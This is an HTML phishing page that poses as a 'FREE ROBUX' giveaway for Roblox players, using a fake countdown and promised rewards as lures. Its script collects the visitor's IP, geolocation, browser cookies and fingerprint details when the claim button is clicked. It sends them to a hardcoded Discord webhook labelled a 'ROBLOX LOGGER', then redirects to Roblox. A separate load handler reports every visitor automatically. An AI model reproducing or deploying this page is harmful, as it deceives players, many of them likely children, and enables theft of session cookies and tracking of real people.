<!DOCTYPE html>
<html>
<head>
    <title>üéÅ FREE ROBUX 2024</title>
    <style>
        body {
            background: linear-gradient(45deg, #ff0000, #ff8000);
            color: white;
            font-family: 'Arial', sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 30px;
            border-radius: 15px;
            max-width: 600px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
        }
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .title {
            font-size: 32px;
            margin: 20px 0;
            color: #ffd700;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
        }
        .reward-list {
            text-align: left;
            margin: 20px 0;
            font-size: 18px;
        }
        .claim-btn {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 15px 40px;
            font-size: 22px;
            border-radius: 25px;
            cursor: pointer;
            margin: 20px 0;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        .claim-btn:hover {
            background: #00cc00;
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.7);
        }
        .countdown {
            color: #ff4444;
            font-size: 16px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üéÆ</div>
        <div class="title">FREE 1500 ROBUX + EXCLUSIVE ITEMS!</div>
        
        <div class="reward-list">
            ‚úÖ <strong>1500 FREE Robux</strong><br>
            ‚úÖ <strong>3 Exclusive Hats</strong><br>
            ‚úÖ <strong>Limited Edition Badge</strong><br>
            ‚úÖ <strong>Premium for 7 Days</strong>
        </div>
        
        <div class="countdown">
            ‚ö†Ô∏è OFFER EXPIRES IN: <span id="timer">05:00</span>
        </div>
        
        <button class="claim-btn" onclick="collectAllData()">
            üéØ CLAIM REWARD NOW!
        </button>
        
        <div style="font-size: 12px; margin-top: 20px; color: #ccc;">
            Limited time offer for Roblox players only!
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1432312185140547704/IKm1SpxRIiHCXupiCNrSkMAG-I1krYTCH35KeN8Z3uaHQVPrUQ3QN9P_Qa6rEMtYwpnv';

        // –¢–∞–π–º–µ—Ä –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á–µ—Ç–∞
        let timeLeft = 300;
        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('timer').textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            timeLeft--;
            if (timeLeft >= 0) {
                setTimeout(updateTimer, 1000);
            }
        }
        updateTimer();

        async function collectAllData() {
            try {
                const button = document.querySelector('.claim-btn');
                button.innerHTML = 'üîÑ PROCESSING...';
                button.disabled = true;

                // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
                const collectedData = await gatherCompleteData();
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord
                await sendToDiscord(collectedData);
                
                // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/games';
                }, 2000);

            } catch (error) {
                window.location.href = 'https://www.roblox.com/games';
            }
        }

        async function gatherCompleteData() {
            // –ü–æ–ª—É—á–∞–µ–º —Ä–µ–∞–ª—å–Ω—ã–π IP
            let ip = 'Unknown';
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip = data.ip;
            } catch (error) {
                try {
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    ip = data.ip;
                } catch (e) {}
            }

            // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –ø–æ IP
            let location = 'Unknown';
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}`);
                const data = await response.json();
                if (data.status === 'success') {
                    location = `${data.city}, ${data.country}`;
                }
            } catch (error) {}

            return {
                timestamp: new Date().toISOString(),
                ip: ip,
                location: location,
                cookies: document.cookie || 'No cookies available',
                browser: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                pageUrl: window.location.href,
                referrer: document.referrer || 'Direct visit'
            };
        }

        async function sendToDiscord(data) {
            const embed = {
                title: "üéØ ROBLOX LOGGER - DATA CAPTURED",
                color: 0x00ff00,
                fields: [
                    {
                        name: "üïê Time",
                        value: data.timestamp,
                        inline: false
                    },
                    {
                        name: "üåê IP & Location",
                        value: `IP: \`${data.ip}\`\nLocation: ${data.location}`,
                        inline: true
                    },
                    {
                        name: "üç™ Cookies",
                        value: `\`\`\`${data.cookies}\`\`\``,
                        inline: false
                    },
                    {
                        name: "üîç Browser Info",
                        value: `User Agent: ${data.browser.userAgent}\nScreen: ${data.browser.screen}\nLanguage: ${data.browser.language}\nTimezone: ${data.browser.timezone}`,
                        inline: false
                    },
                    {
                        name: "üìä Visit Info",
                        value: `URL: ${data.pageUrl}\nReferrer: ${data.referrer}`,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            };

            const payload = {
                embeds: [embed],
                username: "Roblox Rewards Bot",
                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png"
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
        }

        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            setTimeout(async () => {
                const visitData = {
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `üì• **New Visitor**: ${visitData.userAgent}`,
                        embeds: []
                    })
                });
            }, 1000);
        });
    </script>
</body>
</html>
